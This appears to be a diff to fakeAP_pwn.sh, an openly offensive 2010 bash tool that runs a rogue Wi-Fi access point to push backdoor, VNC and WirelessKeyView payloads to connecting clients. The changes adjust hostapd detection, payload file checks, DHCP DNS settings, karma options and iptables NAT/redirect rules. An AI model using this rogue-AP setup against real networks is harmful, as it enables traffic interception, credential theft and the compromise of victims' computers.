@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#66 2010-07-29)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#67 2010-07-30)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -71,7 +71,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
      port=$(shuf -i 2000-65000 -n 1)
-  version="0.3 (Beta-#66)"
+  version="0.3 (Beta-#67)"
       www="${www%/}"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
@@ -423,7 +423,7 @@ if [ "$apType" == "airbase-ng" ] ; then
       fi
    fi
 elif [ "$apType" == "hostapd" ] ; then
-   if [ ! -e /usr/sbin/hostapd ] ; then
+   if [ ! -e /usr/sbin/hostapd ] && [ ! -e /usr/local/bin/hostapd ] ; then
       echo -e "\e[00;31m[-]\e[00m hostapd isn't installed."
       read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
       if [[ $REPLY =~ ^[Yy]$ ]] ; then
@@ -432,7 +432,7 @@ elif [ "$apType" == "hostapd" ] ; then
 #         command=$(tar zxvf libnl-1.1.tar.gz && rm libnl-1.1.tar.gz)
 #         command=$(libnl-1.1/configure)
       fi
-      if [ ! -e /usr/sbin/hostapd ] ; then
+   if [ ! -e /usr/sbin/hostapd ] && [ ! -e /usr/local/bin/hostapd ] ; then
       echo -e "\e[00;31m[-]\e[00m Failed to install hostapd." 1>&2;
       cleanup;
       else
@@ -508,6 +508,7 @@ elif [ "$payload" == "vnc" ] ; then
       fi
    fi
 elif [ "$payload" == "wkv" ] ; then
+   if ! [ -e "$www/wkv-x86.exe" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a wkv-x86.exe at $www/wkv-x86.exe." 1>&2; cleanup; fi
    if ! [ -e "$www/wkv-x64.exe" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a wkv-x64.exe at $www/wkv-x64.exe." 1>&2; cleanup; fi
 else
    if ! [ -e "$backdoorPath" ] ; then echo -e "\e[00;31m[-]\e[00m There isn't a backdoor at $backdoorPath." 1>&2; cleanup; fi
@@ -959,10 +960,14 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
   option routers 10.0.0.1;
   option subnet-mask 255.255.255.0;
   option broadcast-address 10.0.0.255;
-  option domain-name \"Home.com\";
-  option domain-name-servers $gatewayIP;   # OR 10.0.0.1;
-  option netbios-name-servers 10.0.0.100;  # OR 10.0.0.99;
-}" > /tmp/fakeAP_pwn.dhcp
+  option domain-name \"Home.com\";" > /tmp/fakeAP_pwn.dhcp
+if [ "$apMode" == "transparent" ] || [ "$apMode" == "normal" ] ; then 
+    echo "  option domain-name-servers $gatewayIP;" >> /tmp/fakeAP_pwn.dhcp 
+elif [ "$apMode" == "non" ] ; then
+    echo "  option domain-name-servers 10.0.0.1;" >> /tmp/fakeAP_pwn.dhcp
+fi
+echo "  option netbios-name-servers 10.0.0.100;  
+}" >> /tmp/fakeAP_pwn.dhcp
 if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
 if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi
 
@@ -1102,7 +1107,10 @@ ignore_broadcast_ssid=0
 #wmm_ac_vo_acm=0
 eapol_key_index_workaround=0
 eap_server=0
-own_ip_addr=127.0.0.1" > /tmp/fakeAP_pwn.hostapd
+own_ip_addr=127.0.0.1
+#enable_karma=1
+#accept_mac_file=/etc/hostapd/hostapd.accept
+#deny_mac_file=/etc/hostapd/hostapd.deny" > /tmp/fakeAP_pwn.hostapd
    if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.hostapd"; fi
    if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.hostapd; fi
 fi
@@ -1385,17 +1393,10 @@ fi
         echo -e "\e[00;31m[-]\e[00m Can't enable ip_forward" 1>&2
         cleanup
       fi
-#      iptables --table nat --append POSTROUTING -s 10.0.0.0/24 --out-interface $interface --jump MASQUERADE
-#      iptables -A FORWARD -s 10.0.0.0/24 -o $interface -j ACCEPT
-##      iptables -A FORWARD -d 10.0.0.0/24 -m conntrack --ctstate ESTABLISHED,RELATED -i $interface -j ACCEPT <--- gives error: iptables: Protocol wrong type for socket
-#      iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
-#      iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP
-##      iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 -i $interface -d $gatewayIP -p all -j DROP  #protect the gateway <--- gives error: iptables: No chain/target/match by that name
-
-#      Temp fix till the above stuff works.
       iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
       iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
-      iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP
+      iptables --table nat --append PREROUTING --proto all --jump DNAT --to-destination $gatewayIP
+      iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 -i $apInterface -d $gatewayIP -p all -j DROP  #protect the gateway
    fi
 
 #----------------------------------------------------------------------------------------------#
